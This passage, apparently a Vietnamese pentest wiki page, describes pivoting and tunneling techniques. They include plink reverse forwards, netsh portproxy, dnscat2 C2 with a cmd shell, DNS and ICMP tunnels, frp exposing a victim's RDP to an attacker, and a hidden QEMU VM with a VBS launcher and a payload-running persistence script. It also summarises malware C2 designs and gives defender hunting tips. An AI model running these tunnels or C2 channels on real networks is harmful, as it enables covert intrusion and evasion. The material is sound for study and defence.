Vì binary này sẽ được thực thi trên máy nạn nhân và là một SSH client, hãy mở dịch vụ SSH và cổng để nhận kết nối ngược; ví dụ sau dùng `-R` để chuyển tiếp một cổng có thể truy cập cục bộ đến máy của kẻ tấn công.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Khi tạo hoặc thay đổi các quy tắc `portproxy` tồn tại lâu dài, hãy sử dụng context có quyền phù hợp với host. Microsoft mô tả các dạng thêm, hiển thị và xóa `v4tov4` được dùng bên dưới.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Triển khai `portproxy` thông qua tác vụ đã lên lịch

Khi có thông tin xác thực quản trị, có thể thực thi Task Scheduler từ xa để cài đặt quy tắc chuyển tiếp gốc mà không cần tải lên một relay chuyên dụng. Ví dụ: [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) có thể khiến một pivot lắng nghe trên TCP/443 và chuyển tiếp kết nối đến dịch vụ SMB nội bộ.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Quy tắc này có tính duy trì, vì vậy hãy liệt kê bằng `netsh interface portproxy show v4tov4` và xóa quy tắc đó sau khi kiểm thử. Hãy nhớ rằng `portproxy` chỉ cung cấp chức năng chuyển tiếp; tường lửa của host cũng phải cho phép cổng đang lắng nghe.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Bạn cần có **quyền truy cập hệ thống qua RDP**.\
Tải xuống:

SocksOverRDP sử dụng Remote Desktop Dynamic Virtual Channels để truyền kết nối SOCKS5 qua một phiên RDP hiện có; plugin client lắng nghe trên `127.0.0.1:1080`, trong khi thành phần server chạy trên máy đích RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Công cụ này sử dụng `Dynamic Virtual Channels` (`DVC`) của tính năng Remote Desktop Service trong Windows. DVC chịu trách nhiệm **tunneling các packet qua kết nối RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Trên máy client, hãy tải **`SocksOverRDP-Plugin.dll`** như sau:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Giờ chúng ta có thể **kết nối** với **máy nạn nhân** qua **RDP** bằng **`mstsc.exe`**. Một **thông báo** cho biết **plugin SocksOverRDP đã được bật** sẽ xuất hiện và plugin sẽ **lắng nghe** trên **127.0.0.1:1080**.

**Kết nối** qua **RDP**, rồi tải lên và thực thi tệp nhị phân `SocksOverRDP-Server.exe` trên máy nạn nhân:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Bây giờ, hãy xác nhận trên máy của bạn (attacker) rằng cổng 1080 đang lắng nghe:

```
netstat -antb | findstr 1080
```

Giờ bạn có thể dùng [**Proxifier**](https://www.proxifier.com/) để chuyển tiếp lưu lượng qua cổng đó.<sup>[[26]](#references)</sup>

### Săn tìm kênh ảo RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) là một tunnel kênh ảo RDP khác; tên kênh mặc định là `rdp2tcp`, nhưng operator có thể chọn tên khác.<sup>[[56]](#references)</sup> Việc tạo và đóng kênh được ghi lại trong `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` dưới dạng event ID **132** và **148**. Hãy tìm `rdp2tcp` và các tên kênh hiếm/ngẫu nhiên, sau đó so sánh chúng với các kênh dự kiến như `XPSRD`, `cliprdr` và `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Proxy hóa ứng dụng GUI trên Windows

Bạn có thể cấu hình ứng dụng GUI trên Windows sử dụng proxy bằng [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Trong **Profile -> Proxy Servers**, thêm IP và cổng của SOCKS server.\
Trong **Profile -> Proxification Rules**, thêm tên chương trình cần proxy hóa và các kết nối đến những IP bạn muốn proxy hóa; quy tắc Proxifier có thể khớp với ứng dụng, host đích và cổng.<sup>[[27]](#references)</sup>

## Tunneling qua proxy NTLM

Công cụ đã đề cập trước đó, **Rpivot**, có thể relay qua proxy xác thực NTLM. **OpenVPN** cũng có thể định tuyến qua proxy này khi được cấu hình với file xác thực và phương thức NTLMv2; đây là cách đi qua proxy, không phải bypass xác thực proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm xác thực với các proxy NTLM upstream, mở các listener cục bộ và có thể ánh xạ một cổng tunnel cục bộ đến một dịch vụ đích; sau đó, các client có thể sử dụng cổng cục bộ đó.<sup>[[29]](#references)</sup>\
Ví dụ, chuyển tiếp cổng 443 đó

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Giờ đây, nếu bạn đặt dịch vụ **SSH** trên máy nạn nhân lắng nghe ở cổng 443, bạn có thể kết nối đến dịch vụ đó thông qua cổng 2222 trên máy tấn công.<sup>[[29]](#references)</sup>\
Bạn cũng có thể dùng **meterpreter** kết nối đến localhost:443 trong khi máy tấn công lắng nghe ở cổng 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) là bộ công cụ reverse proxy của Microsoft dành cho .NET. Bạn có thể tìm thấy nó tại đây: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine tạo một tunnel IPv4 thông qua các truy vấn DNS và sử dụng các giao diện TUN; theo tài liệu, cần có các quyền cần thiết để tạo những giao diện này ở cả hai đầu.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transport có overhead cao hơn TCP trực tiếp và thường chậm; bạn có thể tạo kết nối SSH được nén qua tunnel này bằng cách sử dụng:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Tải xuống tại đây**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 thiết lập một kênh command-and-control được mã hóa qua DNS; các lệnh server và client bên dưới tuân theo cách sử dụng được tài liệu hóa.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **Trong PowerShell**

Bạn có thể dùng [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) để chạy một client dnscat2 trong PowerShell; README của công cụ này mô tả các tham số `Start-Dnscat2` được hiển thị bên dưới.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Chuyển tiếp cổng bằng dnscat**

Lệnh `listen` tương tác của Dnscat2 ánh xạ một listener cục bộ đến một host và cổng từ xa.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Thay đổi DNS của proxychains

Proxychains-ng móc nối các kết nối TCP được liên kết động và không thể truyền UDP hoặc ICMP; có thể cấu hình proxy DNS, vì vậy hãy kiểm tra `proxychains.conf` và trình trợ giúp phân giải tên đã cài đặt thay vì mặc định cho rằng luôn dùng một máy chủ DNS công khai cố định. Các script `proxyresolv` đời cũ cung cấp biến `PROXY_DNS_SERVER` để chọn máy chủ phân giải; hãy dùng máy chủ phân giải có thể truy cập từ pivot khi cần phân giải tên nội bộ.<sup>[[34]](#references)[[35]](#references)</sup>

## Đường hầm trong Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 tùy chỉnh qua DNS TXT / HTTP JSON (AK47C2)

Tác nhân Storm-2603 đã tạo một **C2 hai kênh ("AK47C2")** chỉ lạm dụng lưu lượng đi ra qua **DNS** và **HTTP POST thuần** — hai giao thức hiếm khi bị chặn trên mạng doanh nghiệp.<sup>[[2]](#references)</sup>

1. **Chế độ DNS (AK47DNS)**
   • Tạo một SessionID ngẫu nhiên gồm 5 ký tự (ví dụ: `H4T14`).  
   • Thêm tiền tố `1` cho *yêu cầu tác vụ* hoặc `2` cho *kết quả*, rồi nối các trường khác nhau (cờ, SessionID, tên máy tính).  
   • Mỗi trường được **mã hóa XOR bằng khóa ASCII `VHBD@H`**, chuyển thành dạng hex và nối với nhau bằng dấu chấm — cuối cùng thêm domain do kẻ tấn công kiểm soát:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Requests sử dụng `DnsQuery()` cho các bản ghi **TXT** (và **MG** làm phương án dự phòng).  
   • Khi phản hồi vượt quá 0xFF byte, backdoor **chia nhỏ** dữ liệu thành các phần 63 byte và chèn các marker:
     `s<SessionID>t<TOTAL>p<POS>` để máy chủ C2 có thể sắp xếp lại chúng.

2. **Chế độ HTTP (AK47HTTP)**
   • Tạo một JSON envelope:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Toàn bộ blob được XOR-`VHBD@H` → hex → gửi làm body của **`POST /`** với header `Content-Type: text/plain`.
   • Phản hồi dùng cùng kiểu mã hóa và trường `cmd` được thực thi bằng `cmd.exe /c <command> 2>&1`.

Ghi chú dành cho Blue Team
• Tìm các **TXT query** bất thường có nhãn đầu tiên là chuỗi hexadecimal dài và luôn kết thúc bằng cùng một miền hiếm.  
• Khóa XOR cố định theo sau bởi ASCII-hex rất dễ phát hiện bằng YARA: `6?56484244?484` (`VHBD@H` ở dạng hex).  
• Với HTTP, hãy gắn cờ các body của POST có kiểu text/plain, chỉ chứa hex và có độ dài là bội số của hai byte.

{{#note}}
Kênh này giữ mỗi nhãn sub-domain trong giới hạn 63 octet của DNS, nhưng tuân thủ giao thức không đồng nghĩa với việc khó bị phát hiện; miền hiếm, nhãn hexadecimal dài và lưu lượng truy vấn vẫn là các dấu hiệu để phát hiện.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans mô tả một tunnel IPv4-over-ICMP sử dụng thiết bị TUN và các yêu cầu ICMP echo; quá trình thiết lập cần có đủ đặc quyền để tạo giao diện.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Tải xuống tại đây**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng truyền các kết nối TCP qua ICMP và sử dụng các tùy chọn `-p`, `-l`, `-r` và `-R` bên dưới lần lượt cho proxy, trình lắng nghe cục bộ, máy chủ đích và cổng đích.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) là một agent giúp đưa các dịch vụ mạng cục bộ lên mạng thông qua một tunnel bảo mật; tài liệu CLI mô tả các endpoint HTTP, TCP và URL tệp, còn hostname endpoint được in ra có thể khác nhau tùy endpoint và tài khoản.<sup>[[39]](#references)</sup>

### Cài đặt

- Tạo tài khoản: https://ngrok.com/signup
- Tải xuống client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Các cách sử dụng cơ bản

**Tài liệu:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent cũng hỗ trợ các tùy chọn xác thực và TLS khi cần.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Công khai tệp qua HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing lời gọi HTTP

_Hữu ích cho XSS, SSRF, SSTI ..._\
Agent độc lập mặc định cung cấp giao diện kiểm tra HTTP tại `http://127.0.0.1:4040`; giao diện này dành cho lưu lượng HTTP.<sup>[[40]](#references)</sup>

#### Tunneling dịch vụ HTTP nội bộ

Tùy chọn `--host-header=rewrite` viết lại header `Host` của HTTP upstream để khớp với dịch vụ cục bộ.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Ví dụ cấu hình đơn giản cho ngrok.yaml

Cấu hình này sử dụng ngrok Agent Config v2; các tunnel được đặt tên dùng `proto` và `addr`, rồi được khởi chạy bằng `ngrok start`.<sup>[[42]](#references)</sup> Cấu hình mở 3 tunnel:

- 2 TCP
- 1 HTTP để cung cấp các tệp tĩnh từ /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels có thể công khai một dịch vụ chạy cục bộ dựa trên TCP thông qua hạ tầng relay của Microsoft. CLI trên máy chủ tạo một tunnel đi ra ngoài, trong khi `devtunnel connect` tạo lại cổng đã lưu trữ trên máy khách; theo mặc định, tunnel yêu cầu xác thực, trừ khi các biện pháp kiểm soát quyền truy cập được chủ động nới lỏng.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Điều này có thể làm lộ RDP qua `*.devtunnels.ms` mà không cần mở listener inbound mới ở perimeter. Nó cũng có thể kết hợp với một tunnel qua kênh ảo RDP như `rdp2tcp`, biến phiên RDP thành pivot giai đoạn hai cho lưu lượng TCP tùy ý.<sup>[[58]](#references)</sup>

Để hunting, hãy đối chiếu việc thực thi Dev Tunnels CLI với lưu lượng DNS/TLS đến `*.devtunnels.ms` và các sự kiện kênh ảo RDP bất thường. Một tunnel đã xác thực không mặc nhiên an toàn chỉ vì nó dùng relay thuộc sở hữu của Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Connector `cloudflared` của Cloudflare Tunnel thiết lập các kết nối outbound; các ứng dụng được publish có thể định tuyến HTTP, HTTPS, TCP, SSH và RDP, trong khi quick tunnel được thiết kế cho việc phát triển HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Lệnh một dòng cho quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Origin SOCKS5 (chế độ legacy)

Cờ `--socks5` legacy cho `cloudflared` biết rằng origin cục bộ sử dụng SOCKS5; cờ này không tạo một SOCKS5 listener cục bộ. Với managed tunnel, `originRequest.proxyType: socks` cấu hình xử lý origin SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Tunnel bền vững với DNS

Cấu hình tunnel được quản lý cục bộ sử dụng các khóa viết thường `tunnel`, `credentials-file` và `url` như minh họa bên dưới.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Khởi động connector:

```bash
cloudflared tunnel run mytunnel
```

Connector thiết lập các kết nối outbound và theo mặc định sẽ thương lượng QUIC, với phương án dự phòng là HTTP/2; đừng cho rằng mọi deployment đều dùng TCP/443. Chỉ chạy connector với các quyền cần thiết cho deployment của bạn.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) là reverse proxy viết bằng Go, hỗ trợ **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX và XTCP**. XTCP dùng kỹ thuật đục lỗ P2P, với khả năng thành công phụ thuộc vào NAT. Từ **v0.53.0**, công cụ này có thể hoạt động như một **SSH Tunnel Gateway**, cho phép máy chủ đích dùng OpenSSH client mặc định mà không cần binary `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Đường hầm TCP ngược cổ điển

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Sử dụng SSH gateway mới (không cần binary frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Lệnh trên công khai cổng **8080** của nạn nhân tại **attacker_ip:9000** bằng client OpenSSH mặc định, trong khi `frps` cung cấp gateway.<sup>[[50]](#references)</sup>

## Kết nối ngược UDP có hỗ trợ STUN

Các yêu cầu STUN Binding được gửi từ socket UDP có thể tiết lộ địa chỉ IP và cổng server-reflexive của socket đó, trong khi lưu lượng định kỳ duy trì binding NAT. Máy chủ STUN công khai không phải là relay cho các gói điều khiển tùy ý.<sup>[[60]](#references)</sup> Một thiết kế back-connect được phân tích giữ nguyên socket UDP đó để nhận một gói điều khiển ngắn, sau đó dùng *một kết nối TCP đi ra riêng biệt* để tải và thực thi lệnh sau khi nhận được tín hiệu kích hoạt.<sup>[[59]](#references)</sup>

Để nhận gói UDP từ controller, thiết kế vẫn cần chia sẻ mapping với controller đó và đáp ứng chính sách lọc của NAT. Bộ lọc phụ thuộc vào địa chỉ hoặc cổng có thể chấp nhận phản hồi từ máy chủ STUN nhưng loại bỏ các gói từ một endpoint khác.<sup>[[60]](#references)[[61]](#references)</sup> Đường rendezvous của backdoor được phân tích chưa được xác minh, vì vậy chỉ riêng việc nhận được phản hồi STUN thành công không chứng minh rằng kênh điều khiển có thể truy cập được.<sup>[[59]](#references)</sup> Để xem một giao thức riêng có rendezvous tường minh và cơ chế dự phòng qua relay, hãy xem [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Tunnel ẩn dựa trên VM với QEMU

Mạng user-mode của QEMU không yêu cầu quyền root hoặc quản trị viên đối với mạng ảo, còn `-netdev user,hostfwd=...` chuyển hướng các kết nối TCP, UDP hoặc UNIX từ host đến guest.<sup>[[51]](#references)</sup> TrustedSec đã ghi lại một VM Tiny Core QEMU và một nỗ lực tạo tunnel SSH ngược trong một sự cố mà EDR tập trung vào host có thể bỏ sót hoạt động bên trong guest.<sup>[[1]](#references)</sup>

### Một dòng lệnh nhanh

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Lệnh phía trên khởi chạy một máy khách **Tiny Core Linux** với 256 MiB bộ nhớ máy khách và một ảnh đĩa qcow2; ảnh đĩa không phải là đĩa trong RAM.
• Cổng **2222/tcp** trên máy chủ Windows được chuyển tiếp minh bạch đến **22/tcp** bên trong máy khách.
• Từ góc nhìn của kẻ tấn công, mục tiêu chỉ đơn giản là mở cổng 2222; mọi gói tin đến cổng này đều được xử lý bởi máy chủ SSH đang chạy trong VM.

### Khởi chạy một cách kín đáo thông qua VBScript

TrustedSec đã ghi nhận các lần khởi chạy QEMU bằng VBS và các image Tiny Core trong sự cố được trích dẫn ở trên.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Chạy script bằng `cscript.exe //B update.vbs` sẽ ẩn cửa sổ.<sup>[[1]](#references)</sup>

### Persistence trong guest

Sự cố được trích dẫn mô tả cách duy trì persistence trong guest Tiny Core stateless thông qua `/opt/bootlocal.sh` và `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Đặt payload vào `/opt/123.out`  
2. Thêm vào `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Thêm `home/tc` và `opt` vào `/opt/filetool.lst` để payload được đóng gói vào `mydata.tgz` khi tắt máy.

### Các cân nhắc về telemetry

• Host vẫn để lộ tiến trình QEMU, ảnh qcow2 và mọi listener được chuyển tiếp qua host.  
• Quét tiến trình chỉ trên host có thể không kiểm tra các tiến trình của guest, nhưng ảo hóa không đảm bảo né tránh; telemetry mạng, QEMU và ảnh đĩa vẫn có thể làm lộ hoạt động này.<sup>[[1]](#references)[[51]](#references)</sup>

### Mẹo cho defender

• Cảnh báo khi phát hiện **binary QEMU/VirtualBox/KVM bất thường** trong các đường dẫn mà người dùng có quyền ghi.  
• Chặn các kết nối outbound bắt nguồn từ `qemu-system*.exe`.  
• Săn tìm các cổng lắng nghe hiếm gặp (2222, 10022, …) được bind ngay sau khi QEMU khởi chạy.

## Các nút chuyển tiếp IIS/HTTP.sys qua `HttpAddUrl` (ShadowPad)

Check Point mô tả module IIS của ShadowPad là biến các web server ngoại vi đã bị xâm nhập thành các nút backdoor và relay bằng cách bind các tiền tố URL thông qua `HttpAddUrl`.<sup>[[3]](#references)</sup>

Báo cáo tương tự cũng trình bày chi tiết các giá trị mặc định, listener wildcard, giải mã gói tin, hàng đợi relay và telemetry debug được tóm tắt bên dưới.<sup>[[3]](#references)</sup>

* **Giá trị mặc định của config** – nếu config JSON của module thiếu giá trị, nó sẽ dùng các giá trị mặc định IIS trông hợp lý (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Nhờ đó, IIS phản hồi lưu lượng lành tính với đúng nhận diện thương hiệu.
* **Chặn bắt wildcard** – người vận hành cung cấp danh sách tiền tố URL phân tách bằng dấu chấm phẩy (wildcard trong host + path). Module gọi `HttpAddUrl` cho từng mục, để HTTP.sys định tuyến các request khớp tới handler độc hại; các request không khớp sẽ chuyển về hành vi IIS bình thường.
* **Gói tin đầu tiên được mã hóa** – hai byte đầu tiên của phần thân request mang seed cho một PRNG 32-bit tùy chỉnh. Mọi byte tiếp theo đều được XOR với luồng khóa được tạo ra trước khi phân tích cú pháp giao thức:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Điều phối relay** – module duy trì hai danh sách: “servers” (node thượng nguồn) và “clients” (implant hạ nguồn). Các mục sẽ bị loại nếu không nhận được heartbeat trong khoảng 30 giây. Khi cả hai danh sách đều không rỗng, module ghép server khỏe mạnh đầu tiên với client khỏe mạnh đầu tiên và chỉ việc truyền byte giữa các socket của chúng cho đến khi một bên đóng kết nối.
* **Telemetry gỡ lỗi** – tính năng ghi log tùy chọn lưu lại IP nguồn, IP đích và tổng số byte được chuyển tiếp cho mỗi cặp. Các nhà điều tra đã dùng những dấu vết này để tái dựng mạng lưới ShadowPad trải rộng trên nhiều nạn nhân.

---

## Các công cụ khác cần xem xét

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Ẩn mình trong bóng tối: Đường hầm bí mật thông qua ảo hóa QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Trước ToolShell: Khám phá các hoạt động ransomware trước đây của Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Bên trong Ink Dragon: Hé lộ mạng relay và hoạt động nội bộ của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README của Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Hướng dẫn tham khảo Nmap: Vượt qua các hạn chế của Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Sổ tay ssh của OpenBSD](https://man.openbsd.org/ssh)
- [7] [Sổ tay sshd_config của OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Ghi chú phát hành OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README của sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting trong Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Tài liệu module socks_proxy của Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Tài liệu module autoroute của Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Chuyển tiếp cổng ngược](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README của reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README của Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Hướng dẫn bắt đầu nhanh của Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners của Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost của Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README của rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Sổ tay socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Sổ tay PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Các tùy chọn dòng lệnh PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Lệnh netsh interface portproxy của Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README của SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Tài liệu Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Quy tắc Proxification của Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Sổ tay OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README của YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README của iodine](https://code.kryo.se/iodine/README.html)
- [32] [README của dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
